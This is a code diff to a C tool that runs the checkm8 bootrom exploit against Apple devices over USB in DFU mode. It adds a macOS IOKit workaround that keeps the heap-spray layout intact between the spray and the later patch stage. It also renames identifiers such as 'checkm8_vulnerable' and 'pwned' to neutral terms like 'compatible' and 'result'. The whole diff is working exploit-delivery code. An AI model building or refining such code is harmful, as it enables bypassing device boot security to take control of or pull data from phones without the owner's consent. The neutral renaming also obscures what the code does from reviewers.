@@ -38,7 +38,7 @@ int dfu_init(dfu_ctx_t *ctx, device_info_t *dev)
         return -1;
     }
 
-    if (!chip->checkm8_vulnerable) {
+    if (!chip->checkm8_compatible) {
         log_error("dfu_init: chip %s (0x%04X) is not compatible",
                   chip->name, chip->cpid);
         return -1;
@@ -128,12 +128,60 @@ int dfu_deliver(dfu_ctx_t *ctx)
     }
 #endif
 
+#if defined(__APPLE__)
+    /*
+     * On macOS IOKit, skip the CLR_STATUS inside the spray.
+     *
+     * The spray's stall+leak+no_leak use 1ms-timeout transfers that
+     * "succeed" by timing out before the XHCI reports the halt.  These
+     * accumulate failure state inside the IOKit user client.  After the
+     * spray loop, the handle is poisoned: any transfer with a real
+     * timeout returns kIOReturnNotResponding (0xe00002ed).
+     *
+     * We'll send CLR_STATUS after refreshing the handle below.
+     */
+    int saved_skip_clr = ctx->skip_clrstatus;
+    if (iokit_usb_is_active())
+        ctx->skip_clrstatus = 1;
+#endif
+
     if (checkm8_stage_spray(ctx) != 0) {
 #if defined(__APPLE__)
+        ctx->skip_clrstatus = saved_skip_clr;
         iokit_usb_deactivate();
 #endif
         return -1;
     }
+
+#if defined(__APPLE__)
+    /*
+     * Refresh the IOKit handle between spray and stage 4.
+     *
+     * Closing and reopening the IOKit user client resets the
+     * accumulated failure state without affecting the USB device.
+     * The heap layout from the spray is preserved — only the
+     * host-side IOKit bookkeeping is cleared.
+     */
+    if (iokit_usb_is_active()) {
+        log_info("dfu_deliver: refreshing IOKit handle for stage 4");
+        iokit_usb_deactivate();
+        usleep(200000); /* 200ms for IOKit port recovery */
+        if (iokit_usb_activate() != 0) {
+            log_error("dfu_deliver: IOKit reactivation failed");
+            ctx->skip_clrstatus = saved_skip_clr;
+            return -1;
+        }
+
+        if (!saved_skip_clr) {
+            int clr = usb_ctrl_transfer_no_data_raw(ctx->dev->usb, 0x21,
+                                DFU_REQ_CLRSTATUS,
+                                0, 0, USB_TIMEOUT_MS);
+            log_info("dfu_deliver: CLR_STATUS (fresh handle) ret=%d (%s)",
+                     clr, clr < 0 ? libusb_strerror(clr) : "ok");
+        }
+    }
+    ctx->skip_clrstatus = saved_skip_clr;
+#endif
 
     if (checkm8_stage_patch(ctx) != 0) {
 #if defined(__APPLE__)
@@ -307,7 +355,7 @@ int checkm8_run(device_info_t *dev)
 
     for (attempt = 1; attempt <= MAX_DFU_TRIES; attempt++) {
         dfu_ctx_t ctx;
-        int pwned;
+        int result;
 
         /* On retries, the device USB-resets after a failed attempt.
          * Close the stale handle and re-enumerate before trying again. */
@@ -414,15 +462,15 @@ int checkm8_run(device_info_t *dev)
                 dev->iserial_index = new_iserial;
         }
 
-        pwned = dev->usb ? checkm8_verify(dev) : 0;
+        result = dev->usb ? checkm8_verify(dev) : 0;
         dfu_cleanup(&ctx);
 
-        if (pwned == 1) {
+        if (result == 1) {
             log_info("checkm8_run: success on attempt %d", attempt);
             return 0;
         }
 
-        if (pwned < 0)
+        if (result < 0)
             log_error("checkm8_run: verification error on attempt %d", attempt);
         else
             log_warn("checkm8_run: not completed after attempt %d", attempt);
